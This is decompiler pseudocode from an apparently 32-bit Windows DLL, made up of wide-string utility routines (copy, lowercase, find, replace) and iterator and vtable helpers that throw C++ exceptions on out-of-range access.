_DWORD *__userpurge sub_1000A3E9@<eax>(int a1@<ecx>, unsigned int a2@<ebx>, _DWORD *a3, rsize_t MaxCount)
{
  int v5; // eax
  int v6; // edi
  rsize_t v7; // esi
  int v9; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+14h] [ebp-14h]
  int v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  v11 = 0;
  v5 = *(_DWORD *)(a1 + 4);
  if ( a2 < *(_DWORD *)(v5 + 28) && MaxCount )
  {
    if ( MaxCount == -2 || a2 + MaxCount > *(_DWORD *)(v5 + 28) )
      MaxCount = *(_DWORD *)(v5 + 28) - a2;
    sub_10009D9C(MaxCount, &v9);
    v12 = 1;
    v6 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
    v7 = *(_DWORD *)(v10 + 28) + 1;
    sub_1000A02D(&v9);
    if ( wcsncpy_s(*(wchar_t **)(v10 + 12), v7, (const wchar_t *)(v6 + 2 * a2), MaxCount) )
    {
      sub_1000DEEF(&MaxCount);
      _CxxThrowException(&MaxCount, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    sub_10009F32(a3, (int)&v9);
    v11 = 1;
    LOBYTE(v12) = 0;
    sub_10009F65(&v9);
  }
  else
  {
    sub_10009D2C(a3, &word_1008F8C4);
    v12 = 0;
    v11 = 1;
  }
  return a3;
}

//----- (1000A4C5) --------------------------------------------------------
int *__usercall sub_1000A4C5@<eax>(int *a1@<eax>)
{
  size_t v2; // edi
  char v3; // bl
  wchar_t *v4; // eax
  size_t v6; // [esp-Ch] [ebp-18h]

  v2 = *(_DWORD *)(a1[1] + 28);
  v3 = sub_1000A02D(a1);
  v6 = *(_DWORD *)(a1[1] + 28) + 1;
  v4 = (wchar_t *)sub_1000A1E4(a1);
  _wcsnset_s(v4, v6, 0, v2);
  if ( v3 )
    sub_1000A223((int)a1);
  return a1;
}

//----- (1000A531) --------------------------------------------------------
int *__usercall sub_1000A531@<eax>(int *a1@<eax>)
{
  char v2; // bl
  wchar_t *v3; // eax
  size_t v5; // [esp-4h] [ebp-Ch]

  v2 = sub_1000A02D(a1);
  v5 = *(_DWORD *)(a1[1] + 28) + 1;
  v3 = (wchar_t *)sub_1000A1E4(a1);
  _wcslwr_s(v3, v5);
  if ( v2 )
    sub_1000A223((int)a1);
  return a1;
}

//----- (1000A588) --------------------------------------------------------
int *__userpurge sub_1000A588@<eax>(int *a1@<eax>, __int16 a2)
{
  unsigned int v3; // ebx
  unsigned int i; // edi
  char v6; // [esp+Fh] [ebp-1h]

  v6 = sub_1000A02D(a1);
  v3 = *(_DWORD *)(a1[1] + 28);
  for ( i = 0; i < v3; ++i )
  {
    if ( *(_WORD *)(sub_1000A1E4(a1) + 2 * i) == a2 )
      *(_WORD *)(sub_1000A1E4(a1) + 2 * i) = 95;
  }
  if ( v6 )
    sub_1000A223((int)a1);
  return a1;
}

//----- (1000A60A) --------------------------------------------------------
int __stdcall sub_1000A60A(int a1, int pExceptionObject, int a3, unsigned int a4)
{
  int v4; // edi
  int v5; // eax
  int *v6; // ebx
  int v8; // eax
  int v9; // edi
  int v10; // eax
  int v11; // esi
  int v12; // edi
  int v13; // eax
  unsigned int v14; // ecx
  int v15; // esi
  int v16; // ecx
  int v17; // ecx
  int v18; // esi
  int v19; // [esp+10h] [ebp-3Ch] BYREF
  int v20; // [esp+14h] [ebp-38h]
  int v21[2]; // [esp+20h] [ebp-2Ch] BYREF
  int v22; // [esp+28h] [ebp-24h] BYREF
  int v23; // [esp+2Ch] [ebp-20h] BYREF
  unsigned int v24; // [esp+30h] [ebp-1Ch]
  void *Source; // [esp+34h] [ebp-18h]
  int v26; // [esp+38h] [ebp-14h] BYREF
  unsigned int v27; // [esp+3Ch] [ebp-10h]
  int v28; // [esp+48h] [ebp-4h]

  v4 = pExceptionObject;
  v5 = *(_DWORD *)(pExceptionObject + 4);
  if ( !*(_DWORD *)(v5 + 28) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = (int *)(a1 + 4);
  if ( *(_DWORD *)(v5 + 28) > *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
    return a1;
  sub_1000B37F(&v19);
  v8 = 0;
  v28 = 0;
  v27 = 0;
  while ( 1 )
  {
    v26 = sub_1000A9B5(v4, a1, v8);
    if ( v26 == -1 || a4 && a4 <= v27 )
      break;
    ++v27;
    sub_1000B4A3(&v19, (int)&v26);
    v8 = v26 + 1;
  }
  if ( !v20 )
  {
    v28 = -1;
    sub_1000B3F3((int)&v19);
    return a1;
  }
  sub_10009D9C(
    *(_DWORD *)(*v6 + 28) + v20 * (*(_DWORD *)(*(_DWORD *)(a3 + 4) + 28) - *(_DWORD *)(*(_DWORD *)(v4 + 4) + 28)),
    &v22);
  LOBYTE(v28) = 1;
  sub_1000A4C5(&v22);
  sub_1000ACAE(&v19, (int)v21);
  LOBYTE(v28) = 2;
  a4 = -1;
  v9 = 0;
  v27 = 0;
  do
  {
    v10 = *(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v21[0] + 12))(v21[0]);
    v24 = v10;
    if ( a4 != -1 )
      v10 = v10 - *(_DWORD *)(*(_DWORD *)(pExceptionObject + 4) + 28) - a4;
    a4 = v10;
    Source = *(void **)(*v6 + 12);
    v11 = *(_DWORD *)(v23 + 28) + 1;
    sub_1000A02D(&v22);
    memcpy_s((void *const)(*(_DWORD *)(v23 + 12) + 2 * v9), 2 * (v11 - v9), (char *)Source + 2 * v27, 2 * a4);
    v27 += a4;
    v12 = a4 + v9;
    v13 = *(_DWORD *)(a3 + 4);
    v14 = *(_DWORD *)(v13 + 28);
    Source = *(void **)(v13 + 12);
    v15 = *(_DWORD *)(v23 + 28);
    a4 = v14;
    sub_1000A02D(&v22);
    memcpy_s((void *const)(*(_DWORD *)(v23 + 12) + 2 * v12), 2 * (v15 + 1 - v12), Source, 2 * a4);
    v27 += *(_DWORD *)(*(_DWORD *)(pExceptionObject + 4) + 28);
    v9 = a4 + v12;
    a4 = v24;
    sub_1000AF23(v16, v21[0]);
  }
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v21[0] + 4))(v21[0]) );
  v17 = *(_DWORD *)(*v6 + 28);
  a3 = *(_DWORD *)(*v6 + 12);
  v18 = *(_DWORD *)(v23 + 28);
  pExceptionObject = v17;
  sub_1000A02D(&v22);
  memcpy_s(
    (void *const)(*(_DWORD *)(v23 + 12) + 2 * v9),
    2 * (v18 + 1 - v9),
    (const void *const)(a3 + 2 * v27),
    2 * (pExceptionObject - v27));
  sub_1000A223((int)&v22);
  sub_100021B1(&v23, v6);
  LOBYTE(v28) = 1;
  sub_1000B7F6(v21);
  LOBYTE(v28) = 0;
  sub_10009F65(&v22);
  v28 = -1;
  sub_1000B3F3((int)&v19);
  return a1;
}
// 1000A7B4: variable 'v16' is possibly undefined

//----- (1000A84F) --------------------------------------------------------
int *__userpurge sub_1000A84F@<eax>(int *a1@<eax>, int a2@<ebx>, int pExceptionObject, unsigned int a4)
{
  unsigned int v5; // ecx
  int v6; // eax
  int i; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edi
  rsize_t v12; // [esp-10h] [ebp-1Ch]
  const void *v13; // [esp-Ch] [ebp-18h]
  rsize_t v14; // [esp-8h] [ebp-14h]
  unsigned int v15; // [esp+4h] [ebp-8h]
  char v16; // [esp+Bh] [ebp-1h]

  v5 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28);
  if ( !v5 || *(_DWORD *)(*(_DWORD *)(pExceptionObject + 4) + 28) != v5 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = a1[1];
  if ( v5 <= *(_DWORD *)(v6 + 28) )
  {
    v15 = 0;
    v16 = *(_BYTE *)(v6 + 8);
    for ( i = sub_1000A9B5(a2, (int)a1, 0); ; i = sub_1000A9B5(a2, (int)a1, v10 + 1) )
    {
      v10 = i;
      if ( i == -1 || a4 && a4 <= v15 )
        break;
      v8 = *(_DWORD *)(pExceptionObject + 4);
      ++v15;
      v14 = 2 * *(_DWORD *)(v8 + 28);
      v13 = *(const void **)(v8 + 12);
      v12 = 2 * (*(_DWORD *)(a1[1] + 28) + 1 - v10);
      v9 = sub_1000A1E4(a1);
      memcpy_s((void *const)(v9 + 2 * v10), v12, v13, v14);
    }
    if ( v16 )
      sub_1000A223((int)a1);
  }
  return a1;
}

//----- (1000A8F8) --------------------------------------------------------
int *__usercall sub_1000A8F8@<eax>(unsigned int a1@<eax>, int *a2@<ecx>)
{
  char v4; // bl
  int v5; // edi

  if ( a1 < *(_DWORD *)(a2[1] + 28) )
  {
    v4 = sub_1000A02D(a2);
    *(_WORD *)(sub_1000A1E4(a2) + 2 * a1) = 0;
    v5 = a2[1];
    *(_DWORD *)(v5 + 32) = sub_1000A20B((int)a2);
    if ( v4 )
      sub_1000A223((int)a2);
  }
  return a2;
}

//----- (1000A959) --------------------------------------------------------
BOOL __usercall sub_1000A959@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return _wcsicmp(*(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12), *(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12)) == 0;
}

//----- (1000A974) --------------------------------------------------------
int __userpurge sub_1000A974@<eax>(int a1@<ecx>, int a2@<esi>, wchar_t a3)
{
  wchar_t *v3; // eax

  v3 = wcschr((const wchar_t *)(*(_DWORD *)(*(_DWORD *)(a2 + 4) + 12) + 2 * a1), a3);
  return sub_1000AA32((int)v3, a2);
}

//----- (1000A996) --------------------------------------------------------
int __userpurge sub_1000A996@<eax>(int a1@<esi>, wchar_t a2)
{
  wchar_t *v2; // eax

  v2 = wcsrchr(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), a2);
  return sub_1000AA32((int)v2, a1);
}

//----- (1000A9B5) --------------------------------------------------------
int __userpurge sub_1000A9B5@<eax>(int a1@<eax>, int a2@<esi>, int a3)
{
  wchar_t *v3; // eax

  v3 = wcsstr(
         (const wchar_t *)(*(_DWORD *)(*(_DWORD *)(a2 + 4) + 12) + 2 * a3),
         *(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12));
  return sub_1000AA32((int)v3, a2);
}

//----- (1000AA32) --------------------------------------------------------
int __usercall sub_1000AA32@<eax>(int a1@<eax>, int a2@<ecx>)
{
  if ( a1 )
    return (a1 - *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12)) >> 1;
  else
    return -1;
}

//----- (1000AA43) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA43(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1000AFF8(this, v3, 0);
  else
    v4 = 0;
  sub_1000B83B(a2, (int)v4);
  return a2;
}

//----- (1000AA96) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA96(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1000B162(this, v3, 0);
  else
    v4 = 0;
  sub_1000B7B7(a2, (int)v4);
  return a2;
}

//----- (1000AAE9) --------------------------------------------------------
_DWORD *__thiscall sub_1000AAE9(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1000AFF8(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000B83B(a2, (int)v4);
  return a2;
}

//----- (1000AB44) --------------------------------------------------------
_DWORD *__thiscall sub_1000AB44(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1000B162(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000B7B7(a2, (int)v4);
  return a2;
}

//----- (1000AB9F) --------------------------------------------------------
_DWORD *__thiscall sub_1000AB9F(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1000AFF8(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1000B83B(a2, (int)v6);
  return a2;
}

//----- (1000AC14) --------------------------------------------------------
_DWORD *__thiscall sub_1000AC14(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1000B162(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1000B7B7(a2, (int)v6);
  return a2;
}

//----- (1000AC89) --------------------------------------------------------
void __thiscall sub_1000AC89(_DWORD *this)
{
  *this = &off_1007326C;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007326C: using guessed type int (__thiscall *off_1007326C)(void *Block, char);

//----- (1000ACAE) --------------------------------------------------------
int __thiscall sub_1000ACAE(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1000ACDC) --------------------------------------------------------
int *__thiscall sub_1000ACDC(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000AFB8(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000AD32: variable 'v5' is possibly undefined

//----- (1000AD44) --------------------------------------------------------
int *__thiscall sub_1000AD44(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000AF23(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000AD9A: variable 'v5' is possibly undefined

//----- (1000ADAC) --------------------------------------------------------
void __thiscall sub_1000ADAC(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1000B87A(v2);
}

//----- (1000ADE4) --------------------------------------------------------
void __thiscall sub_1000ADE4(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1000B87A(v3);
}

//----- (1000AE1F) --------------------------------------------------------
void __thiscall sub_1000AE1F(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1000B87A(v2);
}

//----- (1000AE57) --------------------------------------------------------
int __thiscall sub_1000AE57(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000B7F6(v4);
  return v2;
}

//----- (1000AE93) --------------------------------------------------------
int __thiscall sub_1000AE93(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000B87A(v4);
  return v2;
}

//----- (1000AECF) --------------------------------------------------------
void __thiscall sub_1000AECF(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1000B87A(v1);
}

//----- (1000AF23) --------------------------------------------------------
int __usercall sub_1000AF23@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000AF54) --------------------------------------------------------
_DWORD *__thiscall sub_1000AF54(_DWORD *Block, char a2)
{
  sub_1000AC89(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AF73) --------------------------------------------------------
_DWORD *__thiscall sub_1000AF73(_DWORD *Block, char a2)
{
  *Block = &off_100732A4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100732A4: using guessed type int (__thiscall *off_100732A4)(void *Block, char);

//----- (1000AF93) --------------------------------------------------------
_DWORD *__thiscall sub_1000AF93(_DWORD *Block, char a2)
{
  *Block = &off_100732C4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100732C4: using guessed type int (__thiscall *off_100732C4)(void *Block, char);

//----- (1000AFB8) --------------------------------------------------------
int __usercall sub_1000AFB8@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000AFF8) --------------------------------------------------------
_DWORD *__thiscall sub_1000AFF8(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100732A4;
  a2[1] = this;
  *a2 = &off_100732E4;
  a2[2] = a3;
  return result;
}
// 100732A4: using guessed type int (__thiscall *off_100732A4)(void *Block, char);
// 100732E4: using guessed type int (__thiscall *off_100732E4)(void *Block, char);

//----- (1000B02C) --------------------------------------------------------
void __thiscall sub_1000B02C(_DWORD *this)
{
  *this = &off_100732E4;
  *this = &off_100732A4;
}
// 100732A4: using guessed type int (__thiscall *off_100732A4)(void *Block, char);
// 100732E4: using guessed type int (__thiscall *off_100732E4)(void *Block, char);

//----- (1000B051) --------------------------------------------------------
bool __thiscall sub_1000B051(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1000B068) --------------------------------------------------------
BOOL __thiscall sub_1000B068(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000B072) --------------------------------------------------------
int __thiscall sub_1000B072(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000B0AD) --------------------------------------------------------
int __thiscall sub_1000B0AD(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1000B0E3) --------------------------------------------------------
int __thiscall sub_1000B0E3(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000B10B) --------------------------------------------------------
int __thiscall sub_1000B10B(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1000B146) --------------------------------------------------------
int __thiscall sub_1000B146(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1000B162) --------------------------------------------------------
_DWORD *__thiscall sub_1000B162(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100732C4;
  a2[1] = this;
  *a2 = &off_10073304;
  a2[2] = a3;
  return result;
}
// 100732C4: using guessed type int (__thiscall *off_100732C4)(void *Block, char);
// 10073304: using guessed type int (__thiscall *off_10073304)(void *Block, char);

//----- (1000B196) --------------------------------------------------------
void __thiscall sub_1000B196(_DWORD *this)
{
  *this = &off_10073304;
  *this = &off_100732C4;
}
// 100732C4: using guessed type int (__thiscall *off_100732C4)(void *Block, char);
// 10073304: using guessed type int (__thiscall *off_10073304)(void *Block, char);

//----- (1000B1BB) --------------------------------------------------------
bool __thiscall sub_1000B1BB(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1000B1D2) --------------------------------------------------------
BOOL __thiscall sub_1000B1D2(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000B1DC) --------------------------------------------------------
int __thiscall sub_1000B1DC(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000B217) --------------------------------------------------------
int __thiscall sub_1000B217(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1000B24D) --------------------------------------------------------
int __thiscall sub_1000B24D(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000B275) --------------------------------------------------------
int __thiscall sub_1000B275(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1000B2B0) --------------------------------------------------------
int __thiscall sub_1000B2B0(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1000B2CC) --------------------------------------------------------
_DWORD *__thiscall sub_1000B2CC(_DWORD *Block, char a2)
{
  sub_1000B02C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B2EB) --------------------------------------------------------
_DWORD *__thiscall sub_1000B2EB(_DWORD *Block, char a2)
{
  sub_1000B196(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B345) --------------------------------------------------------
LONG __stdcall sub_1000B345(int *a1)
{
  LONG result; // eax

  result = (LONG)a1;
  if ( *a1 )
    return sub_1000BE8E(*a1);
  return result;
}

//----- (1000B37F) --------------------------------------------------------
_DWORD *__stdcall sub_1000B37F(_DWORD *a1)
{
  sub_1000B8CA(a1);
  *a1 = &off_10073210;
  sub_1000B8F5(a1);
  return a1;
}
// 10073210: using guessed type int (__thiscall *off_10073210)(void *Block, char);

//----- (1000B3B1) --------------------------------------------------------
void **__thiscall sub_1000B3B1(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1000B3F3) --------------------------------------------------------
void __thiscall sub_1000B3F3(int this)
{
  *(_DWORD *)this = &off_10073210;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_1000AC89((_DWORD *)this);
}
